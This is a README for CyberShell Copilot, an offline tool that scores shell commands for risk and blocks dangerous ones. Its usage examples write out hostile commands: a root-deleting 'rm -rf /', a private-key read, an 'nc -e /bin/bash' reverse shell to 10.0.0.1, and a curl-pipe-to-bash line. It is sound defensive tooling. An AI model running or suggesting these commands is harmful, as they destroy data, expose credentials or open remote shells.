# CyberShell Copilot

Offline, cybersecurity-aware terminal assistant for Linux and Kali.

CyberShell Copilot suggests Linux, DevOps, and blue-team commands, scores cyber
risk, maps risky patterns to MITRE ATT&CK-style tactics, blocks dangerous
commands, and offers safer alternatives. It never executes anything — it
suggests, scores, warns, blocks, and explains.

The default application is dependency-light and runs on the Python standard
library alone. Its decisions are **deterministic**: the same input always
produces the same suggestion and the same risk verdict, regardless of machine or
run. Optional FAISS and local GGUF LLM backends exist for research experiments
and do not change the deterministic safety layer.

Current version: **0.2.0**. Packaged model: **31 guardrail rules**,
**114 command knowledge-base entries**, and a **143-case benchmark**.

## What Makes It Different

Normal terminal autocomplete asks: "What command might come next?"

CyberShell asks:

- Is the command useful for the current context?
- Is it safe to display?
- Does it touch secrets, persistence, firewall state, disks, containers, or cloud identity?
- Does it resemble attacker behavior?
- Can we suggest a safer read-only alternative?

## Capabilities

- Offline command suggestions from a built-in 114-entry blue-team knowledge base.
- Deterministic cyber risk scoring for typed or generated commands (allow / warn / block).
- Guardrail blocking for destructive filesystem, disk-wipe, reverse-shell, fork-bomb, and harmful natural-language intent patterns, across 31 rules.
- Evasion-resistant analysis: decodes base64/hex payloads, undoes quote/backslash/variable obfuscation, and assesses every sub-command of a pipeline or chain (see [THREAT_MODEL.md](THREAT_MODEL.md)).
- Warning-level detection for secrets access, firewall tampering, persistence, privileged mutation, cloud-credential and metadata access, Kubernetes secret access, public scanning, log clearing, and bulk archive/exfiltration patterns.
- MITRE ATT&CK-style tactic and technique metadata in every finding.
- Safer read-only alternatives for high-risk commands.
- Shell history audit that flags risky prior commands with line numbers.
- Built-in read-only incident-response playbooks.
- Knowledge-base search (multi-word queries supported) and guardrail rule inspection.
- Policy modes for SOC, strict production, admin, learner, and authorized lab use.
- CyberShell-Bench JSONL benchmark and evaluator with a per-category breakdown.
- Optional FAISS HNSW and local GGUF LLM backend scaffolds for research.
- Prefix cache for accepted suggestions.
- Opt-in local JSONL audit trail with minimized, secret-redacted fields.
- Bash and Zsh key bindings for inserting safe suggestions.

## Install On Linux / Kali

```bash
sudo apt update
sudo apt install -y git python3 python3-venv python3-pip

git clone https://github.com/waltr0/smartTerminal.git
cd smartTerminal
bash install.sh
cybershell doctor
```

Install with Bash key bindings:

```bash
bash install.sh --shell bash
source ~/.bashrc
```

Install with Zsh key bindings:

```bash
bash install.sh --shell zsh
source ~/.zshrc
```

If `cybershell` is not found after installation:

```bash
export PATH="$HOME/.local/bin:$PATH"
```

Detailed docs:

- [Platform support](docs/PLATFORM_SUPPORT.md) — what applies on Linux vs macOS vs Windows
- [Privacy and data handling](PRIVACY.md)
- [Linux install](docs/INSTALL_LINUX.md)
- [Kali setup](docs/KALI_SETUP.md)
- [Shell integration](docs/SHELL_INTEGRATION.md)
- [User manual (Markdown)](docs/USER_MANUAL.md)
- [User manual (PDF, v0.2.0)](docs/CyberShell_Copilot_User_Manual_v0.2.0.pdf)
- [Maintainer handoff checklist](HANDOFF.md)

> The Markdown docs above, this README, and the v0.2.0 user manual PDF are the
> maintained sources of truth. Regenerate the PDF with
> `python tools/build_manual_pdf.py`.

## Command Reference

CyberShell exposes 14 subcommands. Run `cybershell <command> -h` for full flags.

| Command | What it does |
|---|---|
| `suggest` | Suggest a safe command from a prefix or natural-language intent, then score it. |
| `risk` | Score the risk of a command and print findings plus safer alternatives. |
| `explain` | Verbose risk view with full findings, ATT&CK metadata, and alternatives. |
| `accept` | Persist an accepted suggestion into a prefix cache file. |
| `doctor` | Check packaged data and runtime readiness. |
| `backends` | Show which suggestion backends (knowledge base, FAISS, LLM) are available. |
| `kb-search` | Search the packaged command knowledge base (multi-word queries allowed). |
| `rules` | List the guardrail rules (`--json` for machine-readable output). |
| `policies` | List policy modes and their caution/danger/block thresholds. |
| `bench-eval` | Run the CyberShell-Bench evaluation and print metrics by category. |
| `history-audit` | Scan a shell history file and flag risky prior commands by line number. |
| `playbook` | List or show read-only incident-response playbooks. |
| `interactive` | Interactive prompt: type a partial command or intent and see suggestion + risk. |
| `audit-report` | Summarize the local opt-in audit trail. |

Exit codes are decision-aware for `risk` and `explain`: `0` for allow/warn, `2`
for block. `suggest` returns `1` when it must clarify or the request is
unsupported, and `2` when the input itself is blocked.

## Quick Commands

```bash
cybershell suggest --partial "journal" --cwd /var/log
cybershell risk -- "rm -rf /"
cybershell explain -- "cat ~/.ssh/id_rsa"
cybershell kb-search failed ssh logins
cybershell playbook list
cybershell playbook show ssh-bruteforce-triage
cybershell history-audit --history-file ~/.bash_history
cybershell bench-eval --fail-on-miss
```

## Usage Examples

### Suggest from a prefix

```bash
cybershell suggest --partial "journal" --cwd /var/log
```

```text
Suggestion: journalctl -p err -b
Completion: ctl -p err -b
Source: knowledge-base (0.99)
Why: Show error-priority journal entries for the current boot. Domain: incident-response. ATT&CK-style tactic: Discovery.
Status: answered
Message: Safe candidate generated from packaged knowledge.

Risk: safe / decision=allow / score=0
Summary: No guardrail patterns matched; command appears safe for display.
```

### Suggest from natural-language intent

```bash
cybershell suggest --partial "show ssh failed logins" --cwd .
```

```text
Suggestion: sudo grep -i "failed password" /var/log/auth.log
Source: knowledge-base (0.65)
Why: Find failed SSH password attempts in Debian/Ubuntu auth logs. Domain: incident-response. ATT&CK-style tactic: Credential Access.
Status: answered
```

### Score a dangerous command

```bash
cybershell risk -- "rm -rf /"
```

```text
Risk: blocked / decision=block / score=181
Summary: Blocked because high-risk guardrails matched: Deletion target appears to include the filesystem root.; Removal targets the filesystem root, a system directory or file, or a home directory.
Findings:
  - fs.rm_recursive_force: Recursive removal detected; confirm the target before running. (+6, evidence='rm -rf') [Impact T1485]
  - fs.delete_root: Deletion target appears to include the filesystem root. (+95, evidence='rm -rf /') [Impact T1485]
  - fs.destructive_critical_path: Removal targets the filesystem root, a system directory or file, or a home directory. (+80, evidence='/') [Impact T1485]
Safer alternatives:
  - ls -la <target>
  - find <target> -maxdepth 1 -print
  - trash-put <target>  # if trash-cli is installed
```

### Explain a credential-access warning

```bash
cybershell explain -- "cat ~/.ssh/id_rsa"
```

```text
Risk: dangerous / decision=warn / score=46
Summary: Dangerous command; require explicit review: Command may print private key material to the terminal.
Findings:
  - secret.private_key_read: Command may print private key material to the terminal. (+46, evidence='cat ~/.ssh/id_rsa') [Credential Access T1552]
Safer alternatives:
  - ls -l <secret-file>
  - stat <secret-file>
  - grep -R "REDACTED" <path>  # avoid printing secrets
```

### Search the knowledge base (multi-word)

```bash
cybershell kb-search failed ssh logins
```

```text
4.4  ir.auth_failed_passwords
  sudo grep -i "failed password" /var/log/auth.log
  Find failed SSH password attempts in Debian/Ubuntu auth logs.
3.4  svc.failed_services
  systemctl --failed
  List failed systemd units for operational triage.
```

### Audit shell history

```bash
cybershell history-audit --history-file ~/.bash_history
```

```text
Scanned commands: 5
Risky commands: 3
- line 2: blocked score=86 command=rm -rf /etc
  rules: fs.rm_recursive_force, fs.delete_system_path
- line 3: dangerous score=46 command=cat ~/.ssh/id_rsa
  rules: secret.private_key_read
- line 4: blocked score=70 command=nc -e /bin/bash 10.0.0.1 4444
  rules: shell.reverse_shell_tcp
```

## Query Handling Contract

CyberShell treats every input as one of four outcomes:

- `answered`: a safe candidate was generated and scored.
- `clarify`: the request is too broad, so CyberShell asks for target, scope, or defensive goal instead of guessing.
- `unsupported`: the request is outside the packaged command model.
- `blocked`: the command or natural-language intent violates safety policy.

Recognized defensive work is assisted, vague work is clarified, unsupported work
is stated clearly, and harmful intent is blocked.

## Shell Key Bindings

When shell integration is installed:

- `Ctrl-G`: auto-fill a safe suggestion. If you typed a command prefix, it appends the missing part. If you typed natural-language intent, it replaces the line with the safe command.
- `Ctrl-X Ctrl-G`: show risk for the current command line.

## Policy Modes

```bash
cybershell policies
cybershell risk --mode strict -- "curl http://example.com/install.sh | bash"
cybershell risk --mode lab -- nmap -sV --top-ports 100 127.0.0.1
```

| Mode | Purpose | caution/danger/block |
|---|---|---|
| `soc` | Balanced blue-team defensive investigation. | 10 / 35 / 60 |
| `strict` | Conservative production-sensitive mode. | 6 / 22 / 45 |
| `admin` | Routine system administration. | 12 / 40 / 64 |
| `learner` | Explanation-heavy training mode. | 8 / 28 / 58 |
| `lab` | Authorized lab/CTF mode. | 14 / 44 / 70 |

## Benchmark

```bash
cybershell bench-eval --fail-on-miss
```

CyberShell-Bench is a categorized dataset of 143 cases (135 guardrail decisions
plus 8 suggestion-contract cases) spanning destructive filesystem actions, device
destruction, reverse shells, remote code execution, credential access,
persistence, privilege escalation, defense evasion, recon, obfuscation/evasion,
and a dedicated set of benign commands. Results are reported failures-and-all:

- core accuracy (everything the tool claims to handle): `1.0000`
- suggestion-contract accuracy: `1.0000`
- **false-positive rate: `0.0000` across 66 safe commands**
- block detection recall: `0.9348`
- documented limitations surfaced as expected misses: `3`

The three documented misses (`$(...)` command substitution, multi-layer base64,
and `cd` into a directory followed by a relative delete) are static-analysis
boundaries described in [THREAT_MODEL.md](THREAT_MODEL.md), so honest overall
accuracy is `0.978` rather than a manufactured `1.0`. `--fail-on-miss` exits
non-zero only on unexpected regressions, never on the documented limitations.

## Optional Research Backends

```bash
bash install.sh --research
bash install.sh --llm
cybershell backends
```

The default app does not require FAISS, SentenceTransformers, or a local LLM.
Optional backends are for experiments and ablation studies and never relax the
deterministic safety layer.

## Development From Source

```bash
git clone https://github.com/waltr0/smartTerminal.git
cd smartTerminal
python3 -m venv .venv
source .venv/bin/activate
python -m pip install -e ".[dev]"
python -m unittest discover -s tests -v
cybershell bench-eval --fail-on-miss
```

Without installing:

```bash
PYTHONPATH=src python -m cybershell doctor
PYTHONPATH=src python -m unittest discover -s tests -v
```

Lint, type-check, coverage, and a publishable build:

```bash
ruff check src tests tools
mypy
coverage run --source=src/cybershell -m unittest discover -s tests && coverage report
python -m build && twine check dist/*
```

Suggestions and risk verdicts are deterministic; the suite is verified to pass
under varied `PYTHONHASHSEED` values. See [CHANGELOG.md](CHANGELOG.md) for release
history and [THREAT_MODEL.md](THREAT_MODEL.md) for detection scope and limitations.

## Project Structure

```text
smartTerminal/
  benchmarks/
    cybershell_bench.jsonl
  docs/
  scripts/
    cybershell.bash
    cybershell.zsh
  src/cybershell/
    cli.py
    engine.py
    risk.py
    policy.py
    benchmark.py
    backends.py
    kb.py
    cache.py
    audit.py
    i18n.py
    data/
  tests/
  tools/
  install.sh
  uninstall.sh
  Makefile
```

## Uninstall

```bash
bash uninstall.sh
```

Remove audit/cache data too:

```bash
bash uninstall.sh --purge-data
```

## Safety Notice

CyberShell does not execute commands. It suggests, scores, warns, blocks, and
explains. Users remain responsible for any command they choose to run. Detection
is static and best-effort; see [THREAT_MODEL.md](THREAT_MODEL.md) for known
boundaries.

## Contributing

See:

- [CONTRIBUTING.md](CONTRIBUTING.md)
- [SECURITY.md](SECURITY.md)
- [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md)

## License

MIT. See [LICENSE](LICENSE).
